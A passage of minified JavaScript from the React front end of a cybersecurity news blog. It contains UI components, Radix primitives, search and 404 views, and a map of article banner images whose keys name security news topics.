e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}}var ey=s2(v2);function yt(...n){return ey(Ed(n))}const ty=Pe.forwardRef(({className:n,...t},r)=>x.jsx("div",{ref:r,className:yt("rounded-lg border bg-card text-card-foreground shadow-sm",n),...t}));ty.displayName="Card";const iy=Pe.forwardRef(({className:n,...t},r)=>x.jsx("div",{ref:r,className:yt("flex flex-col space-y-1.5 p-6",n),...t}));iy.displayName="CardHeader";const ny=Pe.forwardRef(({className:n,...t},r)=>x.jsx("h3",{ref:r,className:yt("text-2xl font-semibold leading-none tracking-tight",n),...t}));ny.displayName="CardTitle";const ry=Pe.forwardRef(({className:n,...t},r)=>x.jsx("p",{ref:r,className:yt("text-sm text-muted-foreground",n),...t}));ry.displayName="CardDescription";const sy=Pe.forwardRef(({className:n,...t},r)=>x.jsx("div",{ref:r,className:yt("p-6 pt-0",n),...t}));sy.displayName="CardContent";const oy=Pe.forwardRef(({className:n,...t},r)=>x.jsx("div",{ref:r,className:yt("flex items-center p-6 pt-0",n),...t}));oy.displayName="CardFooter";function Yf(n,t){if(typeof n=="function")return n(t);n!=null&&(n.current=t)}function ay(...n){return t=>{let r=!1;const s=n.map(a=>{const c=Yf(a,t);return!r&&typeof c=="function"&&(r=!0),c});if(r)return()=>{for(let a=0;a<s.length;a++){const c=s[a];typeof c=="function"?c():Yf(n[a],null)}}}}function hn(...n){return S.useCallback(ay(...n),n)}function Yo(n){const t=k2(n),r=S.forwardRef((s,a)=>{const{children:c,...d}=s,h=S.Children.toArray(c),p=h.find(T2);if(p){const f=p.props.children,m=h.map(y=>y===p?S.Children.count(f)>1?S.Children.only(null):S.isValidElement(f)?f.props.children:null:y);return x.jsx(t,{...d,ref:a,children:S.isValidElement(f)?S.cloneElement(f,void 0,m):null})}return x.jsx(t,{...d,ref:a,children:c})});return r.displayName=`${n}.Slot`,r}var w2=Yo("Slot");function k2(n){const t=S.forwardRef((r,s)=>{const{children:a,...c}=r;if(S.isValidElement(a)){const d=A2(a),h=S2(c,a.props);return a.type!==S.Fragment&&(h.ref=s?ay(s,d):d),S.cloneElement(a,h)}return S.Children.count(a)>1?S.Children.only(null):null});return t.displayName=`${n}.SlotClone`,t}var x2=Symbol("radix.slottable");function T2(n){return S.isValidElement(n)&&typeof n.type=="function"&&"__radixId"in n.type&&n.type.__radixId===x2}function S2(n,t){const r={...t};for(const s in t){const a=n[s],c=t[s];/^on[A-Z]/.test(s)?a&&c?r[s]=(...h)=>{const p=c(...h);return a(...h),p}:a&&(r[s]=a):s==="style"?r[s]={...a,...c}:s==="className"&&(r[s]=[a,c].filter(Boolean).join(" "))}return{...n,...r}}function A2(n){let t=Object.getOwnPropertyDescriptor(n.props,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning;return r?n.ref:(t=Object.getOwnPropertyDescriptor(n,"ref")?.get,r=t&&"isReactWarning"in t&&t.isReactWarning,r?n.props.ref:n.props.ref||n.ref)}const Xf=n=>typeof n=="boolean"?`${n}`:n===0?"0":n,Zf=Ed,ly=(n,t)=>r=>{var s;if(t?.variants==null)return Zf(n,r?.class,r?.className);const{variants:a,defaultVariants:c}=t,d=Object.keys(a).map(f=>{const m=r?.[f],y=c?.[f];if(m===null)return null;const v=Xf(m)||Xf(y);return a[f][v]}),h=r&&Object.entries(r).reduce((f,m)=>{let[y,v]=m;return v===void 0||(f[y]=v),f},{}),p=t==null||(s=t.compoundVariants)===null||s===void 0?void 0:s.reduce((f,m)=>{let{class:y,className:v,...w}=m;return Object.entries(w).every(E=>{let[T,C]=E;return Array.isArray(C)?C.includes({...c,...h}[T]):{...c,...h}[T]===C})?[...f,y,v]:f},[]);return Zf(n,d,p,r?.class,r?.className)},C2=ly("inline-flex items-center justify-center rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),$t=Pe.forwardRef(({className:n,variant:t,size:r,asChild:s=!1,...a},c)=>{const d=s?w2:"button";return x.jsx(d,{className:yt(C2({variant:t,size:r,className:n})),ref:c,...a})});$t.displayName="Button";const Xo={default:"https://images.unsplash.com/photo-1549287540-b5e39fc85fa1",zeroDayThreat:"https://ethicalbyte.in/blogs/img/1.webp",phishingConcept:"https://ethicalbyte.in/blogs/img/2.webp",passwordSecurity:"https://ethicalbyte.in/blogs/img/3.webp",vpnConcept:"https://ethicalbyte.in/blogs/img/4.webp",ransomwareLock:"https://ethicalbyte.in/blogs/img/5.webp",iotNetwork:"https://ethicalbyte.in/blogs/img/6.webp",aiCyberThreat:"https://ethicalbyte.in/blogs/img/7.webp",linuxKernelBreach:"https://ethicalbyte.in/blogs/img/8.webp",socialThreats:"https://ethicalbyte.in/blogs/img/9.webp",apt29GmailAttack:"https://ethicalbyte.in/blogs/img/10.webp",passwordLeak16B:"https://ethicalbyte.in/blogs/img/11.webp",gmailPasskeyUpgrade:"https://ethicalbyte.in/blogs/img/12.webp",iranTvHijack:"https://ethicalbyte.in/blogs/img/13.webp",smishingAlert:"https://ethicalbyte.in/blogs/img/14.webp",weeklyCyberRecap:"https://ethicalbyte.in/blogs/img/15.webp",deleteHarmfulApps:"https://ethicalbyte.in/blogs/img/16.webp",chromeZeroDayExploit:"https://ethicalbyte.in/blogs/img/17.webp",fileUploadPhishing:"https://ethicalbyte.in/blogs/img/18.webp",scatteredSpiderAirline:"https://ethicalbyte.in/blogs/img/19.webp",chromeFirefoxUpdate:"https://ethicalbyte.in/blogs/img/20.webp",northKoreaZoomMalware:"https://ethicalbyte.in/blogs/img/21.webp",googleDataVerdict:"https://ethicalbyte.in/blogs/img/22.webp",taiwanChineseApps:"https://ethicalbyte.in/blogs/img/23.webp",catwatchfulSpyware:"https://ethicalbyte.in/blogs/img/24.webp",vishingQantas:"https://ethicalbyte.in/blogs/img/25.webp",euProtectEU:"https://ethicalbyte.in/blogs/img/26.webp",ingramMicroRansomware:"https://ethicalbyte.in/blogs/img/27.webp",maliciousEsDomains:"https://ethicalbyte.in/blogs/img/28.webp",perfektBlueCarHack:"https://ethicalbyte.in/blogs/img/29.webp",cyberTalk2025Banner:"https://ethicalbyte.in/blogs/img/30.webp",deepfakeThreatBanner:"https://ethicalbyte.in/blogs/img/31.webp",nipponSteelBreachBanner:"https://ethicalbyte.in/blogs/img/32.webp",ntroPhishingBanner:"https://ethicalbyte.in/blogs/img/33.webp",evChargingVulnBanner:"https://ethicalbyte.in/blogs/img/34.webp",jackMessagingAppBanner:"https://ethicalbyte.in/blogs/img/35.webp",louisVuittonBreachBanner:"https://ethicalbyte.in/blogs/img/36.webp",oracleJuly2025PatchBanner:"https://ethicalbyte.in/blogs/img/37.webp",bciCybersecurityBanner:"https://ethicalbyte.in/blogs/img/38.webp",mcdonaldsAIHiringBreachBanner:"https://ethicalbyte.in/blogs/img/39.webp",blockchainThreatIntelBanner:"https://ethicalbyte.in/blogs/img/40.webp",tiktokEUPrivacyBanner:"https://ethicalbyte.in/blogs/img/41.webp",massistantSurveillanceBanner:"https://ethicalbyte.in/blogs/img/42.webp",apt41AfricaSharePointBanner:"https://ethicalbyte.in/blogs/img/43.webp",coindcxBreachBanner:"https://ethicalbyte.in/blogs/img/44.webp",staccAttackBanner:"https://ethicalbyte.in/blogs/img/45.webp",usbCableHackingBanner:"https://ethicalbyte.in/blogs/img/46.webp",laughingMantisBanner:"https://ethicalbyte.in/blogs/img/47.webp",allianzBreachBanner:"https://ethicalbyte.in/blogs/img/48.webp",cargoTalonBanner:"https://ethicalbyte.in/blogs/img/49.webp",vastavAIDeepfakeBanner:"https://ethicalbyte.in/blogs/img/50.webp",quantumBitcoinBanner:"https://ethicalbyte.in/blogs/img/51.webp",nigeriaAICybersecurityBanner:"https://ethicalbyte.in/blogs/img/52.webp",microsoftOauthTycoonAttack:"https://ethicalbyte.in/blogs/img/53.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/54.webp",nvidiaTritonExploit:"https://ethicalbyte.in/blogs/img/55.webp",generativeAICyberBanner:"https://ethicalbyte.in/blogs/img/56.webp",networkSecurityDigitalEraBanner:"https://ethicalbyte.in/blogs/img/57.webp",geminicalendarexploitbanner:"https://ethicalbyte.in/blogs/img/58.webp",lenovobadcamexploitbanner:"https://ethicalbyte.in/blogs/img/59.webp",malwareTop5:"https://ethicalbyte.in/blogs/img/60.webp",shinyspider2025:"https://ethicalbyte.in/blogs/img/61.webp",aimlinnovations2025:"https://ethicalbyte.in/blogs/img/62.webp",aideepfakecyberattacks:"https://ethicalbyte.in/blogs/img/63.webp",ermacTrojanLeak:"https://ethicalbyte.in/blogs/img/64.webp",gmailPhishVoicemailBanner:"https://ethicalbyte.in/blogs/img/65.webp",rapperbotDdosBanner:"https://ethicalbyte.in/blogs/img/66.webp",aiBrowserPromptFix2025:"https://ethicalbyte.in/blogs/img/67.webp",quirkyloadermalware2025:"https://ethicalbyte.in/blogs/img/68.webp",operationSerengetiBanner:"https://ethicalbyte.in/blogs/img/69.webp",linuxFilenameMalwareBanner:"https://ethicalbyte.in/blogs/img/70.webp",upcrypterPhishingBanner:"https://ethicalbyte.in/blogs/img/71.webp",storm0501CloudTakeoverBanner:"https://ethicalbyte.in/blogs/img/72.webp",tamperedchefMalwareBanner:"https://ethicalbyte.in/blogs/img/73.webp",velociraptorAbuseBanner:"https://ethicalbyte.in/blogs/img/74.webp",zscalerSalesloftBreachBanner:"https://ethicalbyte.in/blogs/img/75.webp",mystrodxBackdoorBanner:"https://ethicalbyte.in/blogs/img/76.webp",hexstrikeAiWeaponizedBanner:"https://ethicalbyte.in/blogs/img/77.webp",genaiChatGPTLeakBanner:"https://ethicalbyte.in/blogs/img/78.webp",castleRATBanner:"https://ethicalbyte.in/blogs/img/79.webp",barrelFireBanner:"https://ethicalbyte.in/blogs/img/80.webp",fakeHireBanner:"https://ethicalbyte.in/blogs/img/81.webp",pixel10C2PABanner:"https://ethicalbyte.in/blogs/img/82.webp",hybridPetyaBanner:"https://ethicalbyte.in/blogs/img/83.webp",fbiSalesforceBreach:"https://ethicalbyte.in/blogs/img/84.webp",browserAttacks2025Banner:"https://ethicalbyte.in/blogs/img/85.webp",aiAgentControlBanner:"https://ethicalbyte.in/blogs/img/86.webp",venomHotelBanner:"https://ethicalbyte.in/blogs/img/87.webp",aiQuantumCyberBanner:"https://ethicalbyte.in/blogs/img/88.webp",sapSovereignCloudIndia:"https://ethicalbyte.in/blogs/img/89.webp",autonomousAICyberBanner:"https://ethicalbyte.in/blogs/img/90.webp",europeCryptoScam2025:"https://ethicalbyte.in/blogs/img/91.webp",brickstormBackdoorBanner:"https://ethicalbyte.in/blogs/img/92.webp",oneplusSMSVuln:"https://ethicalbyte.in/blogs/img/93.webp",evilaiMalwareBanner:"https://ethicalbyte.in/blogs/img/94.webp",ukBitcoinBust:"https://ethicalbyte.in/blogs/img/95.webp",ukAppleBackdoorBanner:"https://ethicalbyte.in/blogs/img/96.webp",cometJackingBanner:"https://ethicalbyte.in/blogs/img/97.webp",oracleEBSZeroDayBanner:"https://ethicalbyte.in/blogs/img/98.webp",weeklyRecapBannerOct2025:"https://ethicalbyte.in/blogs/img/99.webp",gh0stRat100thBlogBanner:"https://ethicalbyte.in/blogs/img/100.webp",clayratAndroidSpywareBannerV2:"https://ethicalbyte.in/blogs/img/101.webp",whatsappWormBrazilBanner:"https://ethicalbyte.in/blogs/img/102.webp",githubResilienceBanner:"https://ethicalbyte.in/blogs/img/103.webp",funklockerBanner:"https://ethicalbyte.in/blogs/img/104.webp",aibrowserpromptinjectionbanner:"https://ethicalbyte.in/blogs/img/105.webp",aiBrowserBlackWidowBanner:"https://ethicalbyte.in/blogs/img/106.webp",samsungLandfallBanner2025:"https://ethicalbyte.in/blogs/img/107.webp"},cy=({post:n})=>{const{theme:t}=zi(),r={hidden:{opacity:0,y:20},visible:{opacity:1,y:0},hover:{scale:1.02,boxShadow:t==="dark"?"0px 10px 20px hsla(var(--primary), 0.25)":"0px 8px 25px rgba(0, 0, 0, 0.08)"}},s=t==="dark"?"bg-card border-border hover:border-primary/60":"bg-card border-border hover:border-primary/40",a=t==="dark"?"text-primary hover:text-primary/80":"text-foreground hover:text-primary",c=t==="dark"?"text-slate-400":"text-muted-foreground",d=t==="dark"?"text-slate-300":"text-foreground/80",h=t==="dark"?"text-accent hover:text-accent/80":"text-primary hover:text-primary/80",p=Xo[n.imageKey]||Xo.default,f=`#/post/${n.id}`;return x.jsx(et.div,{variants:r,whileHover:"hover",className:"h-full group",children:x.jsxs(ty,{className:`flex flex-col h-full ${s} transition-all duration-300 shadow-md hover:shadow-xl rounded-xl overflow-hidden`,children:[x.jsxs(iy,{className:"p-0",children:[x.jsx("div",{className:"mb-4 h-48 w-full overflow-hidden",children:x.jsx("a",{href:f,"aria-label":`Read more about ${n.title}`,children:x.jsx("img",{className:"w-full h-full object-cover transition-transform duration-300 group-hover:scale-105",alt:`Blog post illustration for ${n.title}`,src:p})})}),x.jsxs("div",{className:"p-6",children:[x.jsx(ny,{className:`text-xl font-semibold ${a} transition-colors`,children:x.jsx("a",{href:f,children:n.title})}),x.jsxs(ry,{className:`${c} text-xs flex flex-wrap items-center gap-x-3 gap-y-1 mt-2`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(xg,{size:14,className:"mr-1"})," ",n.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(Sg,{size:14,className:"mr-1"})," ",n.author]})]})]})]}),x.jsx(sy,{className:"flex-grow px-6 pb-4",children:x.jsx("p",{className:`${d} leading-relaxed text-sm`,children:n.summary})}),x.jsx(oy,{className:"px-6 pb-6",children:x.jsx($t,{asChild:!0,variant:"link",className:`${h} p-0 text-sm`,children:x.jsxs("a",{href:f,className:"flex items-center font-semibold",children:["Read More ",x.jsx(kg,{size:16,className:"ml-1"})]})})})]})})};function P2(...n){return ey(Ed(n))}const aa=Pe.forwardRef(({className:n,type:t,...r},s)=>x.jsx("input",{type:t,className:P2("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:s,...r}));aa.displayName="Input";const Tc=6,E2=({searchTerm:n,setSearchTerm:t})=>{const{theme:r}=zi(),[s,a]=S.useState([]),c=S.useMemo(()=>[...Pd].sort((C,O)=>new Date(O.date)-new Date(C.date)),[]),d=S.useMemo(()=>n?c.filter(C=>C.title.toLowerCase().includes(n.toLowerCase())||C.summary.toLowerCase().includes(n.toLowerCase())||C.tags&&C.tags.some(O=>O.toLowerCase().includes(n.toLowerCase()))):c.slice(0,Tc),[n,c]);S.useEffect(()=>{a(n?d:c.slice(0,Tc))},[n,c,d]);const h=S.useCallback(C=>{t(C.target.value)},[t]),p=S.useCallback(()=>{t("")},[t]),f={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},m=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",y=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",v=r==="dark"?"text-slate-400":"text-muted-foreground",w=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",E=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(et.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${m} rounded-xl shadow-lg p-8`,children:[x.jsx("h1",{className:`text-5xl md:text-6xl font-bold mb-6 ${y}`,children:"CyberSec Insights"}),x.jsx("p",{className:`text-lg md:text-xl ${v} max-w-3xl mx-auto mb-10`,children:"Your trusted source for the latest in cybersecurity news, threats, and best practices. Stay informed, stay secure."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(Tg,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${E} transition-colors`}),x.jsx(aa,{type:"search",placeholder:"Search recent articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${w}`,value:n,onChange:h}),n&&x.jsx("button",{onClick:p,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(Vo,{size:20})})]})]}),n&&s.length>0&&x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:n})]}),x.jsxs("p",{className:"text-muted-foreground",children:[s.length," post(s) found."]})]}),s.length===0&&x.jsxs(et.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(Vo,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:n?`Sorry, we couldn't find any articles matching "${n}". Try a different search term or view all posts.`:"There are no recent articles available. Check back soon!"})]}),s.length>0&&x.jsx(et.section,{variants:f,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:s.map(C=>x.jsx(cy,{post:C},C.id))}),!n&&c.length>Tc&&x.jsx(et.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:.3},className:"text-center mt-12",children:x.jsx($t,{asChild:!0,size:"lg",className:"bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all",children:x.jsxs("a",{href:"#/all-blogs",children:["View All Posts ",x.jsx(kg,{size:20,className:"ml-2"})]})})})]})},dy=()=>{const{theme:n}=zi(),t=n==="dark"?"text-amber-400":"text-amber-500",r=n==="dark"?"text-red-400":"text-red-500",s=n==="dark"?"text-slate-300":"text-foreground/90",a=n==="dark"?"text-slate-400":"text-muted-foreground",c=n==="dark"?"text-background bg-sky-400 hover:bg-sky-500 hover:shadow-sky-500/50":"text-primary-foreground bg-primary hover:bg-primary/90 hover:shadow-primary/30";return x.jsxs(et.div,{initial:{opacity:0,scale:.9},animate:{opacity:1,scale:1},transition:{duration:.5},className:"flex flex-col items-center justify-center min-h-[70vh] text-center p-6",children:[x.jsx(et.div,{initial:{y:-20,opacity:0},animate:{y:0,opacity:1},transition:{delay:.2,type:"spring",stiffness:120},children:x.jsx(cw,{className:`mx-auto h-24 w-24 ${t} mb-6`})}),x.jsx("h1",{className:`text-6xl font-extrabold ${r} mb-4`,children:"404"}),x.jsx("h2",{className:`text-3xl font-semibold ${s} mb-6`,children:"Content Not Found"}),x.jsx("p",{className:`text-lg ${a} max-w-md mx-auto mb-8`,children:"Oops! The content you're looking for at this URL path doesn't exist. It might have been moved or the link is incorrect."}),x.jsxs("a",{href:"#/",className:`inline-flex items-center justify-center px-8 py-3 border border-transparent text-base font-medium rounded-md ${c} transition-all shadow-lg`,children:[x.jsx(yw,{size:20,className:"mr-2"}),"Go Back Home"]})]})},uy=Pe.forwardRef(({className:n,...t},r)=>x.jsx("textarea",{className:yt("flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",n),ref:r,...t}));uy.displayName="Textarea";var _d=wg();const I2=nd(_d);function Tt(n,t,{checkForDefaultPrevented:r=!0}={}){return function(a){if(n?.(a),r===!1||!a.defaultPrevented)return t?.(a)}}function hy(n,t=[]){let r=[];function s(c,d){const h=S.createContext(d),p=r.length;r=[...r,d];const f=y=>{const{scope:v,children:w,...E}=y,T=v?.[n]?.[p]||h,C=S.useMemo(()=>E,Object.values(E));return x.jsx(T.Provider,{value:C,children:w})};f.displayName=c+"Provider";function m(y,v){const w=v?.[n]?.[p]||h,E=S.useContext(w);if(E)return E;if(d!==void 0)return d;throw new Error(`\`${y}\` must be used within \`${c}\``)}return[f,m]}const a=()=>{const c=r.map(d=>S.createContext(d));return function(h){const p=h?.[n]||c;return S.useMemo(()=>({[`__scope${n}`]:{...h,[n]:p}}),[h,p])}};return a.scopeName=n,[s,_2(a,...t)]}function _2(...n){const t=n[0];if(n.length===1)return t;const r=()=>{const s=n.map(a=>({useScope:a(),scopeName:a.scopeName}));return function(c){const d=s.reduce((h,{useScope:p,scopeName:f})=>{const y=p(c)[`__scope${f}`];return{...h,...y}},{});return S.useMemo(()=>({[`__scope${t.scopeName}`]:d}),[d])}};return r.scopeName=t.scopeName,r}function R2(n){const t=n+"CollectionProvider",[r,s]=hy(t),[a,c]=r(t,{collectionRef:{current:null},itemMap:new Map}),d=T=>{const{scope:C,children:O}=T,R=Pe.useRef(null),M=Pe.useRef(new Map).current;return x.jsx(a,{scope:C,itemMap:M,collectionRef:R,children:O})};d.displayName=t;const h=n+"CollectionSlot",p=Yo(h),f=Pe.forwardRef((T,C)=>{const{scope:O,children:R}=T,M=c(h,O),L=hn(C,M.collectionRef);return x.jsx(p,{ref:L,children:R})});f.displayName=h;const m=n+"CollectionItemSlot",y="data-radix-collection-item",v=Yo(m),w=Pe.forwardRef((T,C)=>{const{scope:O,children:R,...M}=T,L=Pe.useRef(null),W=hn(C,L),J=c(m,O);return Pe.useEffect(()=>(J.itemMap.set(L,{ref:L,...M}),()=>void J.itemMap.delete(L))),x.jsx(v,{[y]:"",ref:W,children:R})});w.displayName=m;function E(T){const C=c(n+"CollectionConsumer",T);return Pe.useCallback(()=>{const R=C.collectionRef.current;if(!R)return[];const M=Array.from(R.querySelectorAll(`[${y}]`));return Array.from(C.itemMap.values()).sort((J,G)=>M.indexOf(J.ref.current)-M.indexOf(G.ref.current))},[C.collectionRef,C.itemMap])}return[{Provider:d,Slot:f,ItemSlot:w},E,s]}var D2=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","select","span","svg","ul"],Xt=D2.reduce((n,t)=>{const r=Yo(`Primitive.${t}`),s=S.forwardRef((a,c)=>{const{asChild:d,...h}=a,p=d?r:t;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),x.jsx(p,{...h,ref:c})});return s.displayName=`Primitive.${t}`,{...n,[t]:s}},{});function py(n,t){n&&_d.flushSync(()=>n.dispatchEvent(t))}function pn(n){const t=S.useRef(n);return S.useEffect(()=>{t.current=n}),S.useMemo(()=>(...r)=>t.current?.(...r),[])}function M2(n,t=globalThis?.document){const r=pn(n);S.useEffect(()=>{const s=a=>{a.key==="Escape"&&r(a)};return t.addEventListener("keydown",s,{capture:!0}),()=>t.removeEventListener("keydown",s,{capture:!0})},[r,t])}var j2="DismissableLayer",Jc="dismissableLayer.update",L2="dismissableLayer.pointerDownOutside",O2="dismissableLayer.focusOutside",eg,fy=S.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),gy=S.forwardRef((n,t)=>{const{disableOutsidePointerEvents:r=!1,onEscapeKeyDown:s,onPointerDownOutside:a,onFocusOutside:c,onInteractOutside:d,onDismiss:h,...p}=n,f=S.useContext(fy),[m,y]=S.useState(null),v=m?.ownerDocument??globalThis?.document,[,w]=S.useState({}),E=hn(t,G=>y(G)),T=Array.from(f.layers),[C]=[...f.layersWithOutsidePointerEventsDisabled].slice(-1),O=T.indexOf(C),R=m?T.indexOf(m):-1,M=f.layersWithOutsidePointerEventsDisabled.size>0,L=R>=O,W=N2(G=>{const X=G.target,ne=[...f.branches].some(ge=>ge.contains(X));!L||ne||(a?.(G),d?.(G),G.defaultPrevented||h?.())},v),J=F2(G=>{const X=G.target;[...f.branches].some(ge=>ge.contains(X))||(c?.(G),d?.(G),G.defaultPrevented||h?.())},v);return M2(G=>{R===f.layers.size-1&&(s?.(G),!G.defaultPrevented&&h&&(G.preventDefault(),h()))},v),S.useEffect(()=>{if(m)return r&&(f.layersWithOutsidePointerEventsDisabled.size===0&&(eg=v.body.style.pointerEvents,v.body.style.pointerEvents="none"),f.layersWithOutsidePointerEventsDisabled.add(m)),f.layers.add(m),tg(),()=>{r&&f.layersWithOutsidePointerEventsDisabled.size===1&&(v.body.style.pointerEvents=eg)}},[m,v,r,f]),S.useEffect(()=>()=>{m&&(f.layers.delete(m),f.layersWithOutsidePointerEventsDisabled.delete(m),tg())},[m,f]),S.useEffect(()=>{const G=()=>w({});return document.addEventListener(Jc,G),()=>document.removeEventListener(Jc,G)},[]),x.jsx(Xt.div,{...p,ref:E,style:{pointerEvents:M?L?"auto":"none":void 0,...n.style},onFocusCapture:Tt(n.onFocusCapture,J.onFocusCapture),onBlurCapture:Tt(n.onBlurCapture,J.onBlurCapture),onPointerDownCapture:Tt(n.onPointerDownCapture,W.onPointerDownCapture)})});gy.displayName=j2;var B2="DismissableLayerBranch",my=S.forwardRef((n,t)=>{const r=S.useContext(fy),s=S.useRef(null),a=hn(t,s);return S.useEffect(()=>{const c=s.current;if(c)return r.branches.add(c),()=>{r.branches.delete(c)}},[r.branches]),x.jsx(Xt.div,{...n,ref:a})});my.displayName=B2;function N2(n,t=globalThis?.document){const r=pn(n),s=S.useRef(!1),a=S.useRef(()=>{});return S.useEffect(()=>{const c=h=>{if(h.target&&!s.current){let p=function(){yy(L2,r,f,{discrete:!0})};const f={originalEvent:h};h.pointerType==="touch"?(t.removeEventListener("click",a.current),a.current=p,t.addEventListener("click",a.current,{once:!0})):p()}else t.removeEventListener("click",a.current);s.current=!1},d=window.setTimeout(()=>{t.addEventListener("pointerdown",c)},0);return()=>{window.clearTimeout(d),t.removeEventListener("pointerdown",c),t.removeEventListener("click",a.current)}},[t,r]),{onPointerDownCapture:()=>s.current=!0}}function F2(n,t=globalThis?.document){const r=pn(n),s=S.useRef(!1);return S.useEffect(()=>{const a=c=>{c.target&&!s.current&&yy(O2,r,{originalEvent:c},{discrete:!1})};return t.addEventListener("focusin",a),()=>t.removeEventListener("focusin",a)},[t,r]),{onFocusCapture:()=>s.current=!0,onBlurCapture:()=>s.current=!1}}function tg(){const n=new CustomEvent(Jc);document.dispatchEvent(n)}function yy(n,t,r,{discrete:s}){const a=r.originalEvent.target,c=new CustomEvent(n,{bubbles:!1,cancelable:!0,detail:r});t&&a.addEventListener(n,t,{once:!0}),s?py(a,c):a.dispatchEvent(c)}var z2=gy,U2=my,cs=globalThis?.document?S.useLayoutEffect:()=>{},V2="Portal",by=S.forwardRef((n,t)=>{const{container:r,...s}=n,[a,c]=S.useState(!1);cs(()=>c(!0),[]);const d=r||a&&globalThis?.document?.body;return d?I2.createPortal(x.jsx(Xt.div,{...s,ref:t}),d):null});by.displayName=V2;function W2(n,t){return S.useReducer((r,s)=>t[r][s]??r,n)}var vy=n=>{const{present:t,children:r}=n,s=H2(t),a=typeof r=="function"?r({present:s.isPresent}):S.Children.only(r),c=hn(s.ref,$2(a));return typeof r=="function"||s.isPresent?S.cloneElement(a,{ref:c}):null};vy.displayName="Presence";function H2(n){const[t,r]=S.useState(),s=S.useRef(null),a=S.useRef(n),c=S.useRef("none"),d=n?"mounted":"unmounted",[h,p]=W2(d,{mounted:{UNMOUNT:"unmounted",ANIMATION_OUT:"unmountSuspended"},unmountSuspended:{MOUNT:"mounted",ANIMATION_END:"unmounted"},unmounted:{MOUNT:"mounted"}});return S.useEffect(()=>{const f=Mo(s.current);c.current=h==="mounted"?f:"none"},[h]),cs(()=>{const f=s.current,m=a.current;if(m!==n){const v=c.current,w=Mo(f);n?p("MOUNT"):w==="none"||f?.display==="none"?p("UNMOUNT"):p(m&&v!==w?"ANIMATION_OUT":"UNMOUNT"),a.current=n}},[n,p]),cs(()=>{if(t){let f;const m=t.ownerDocument.defaultView??window,y=w=>{const 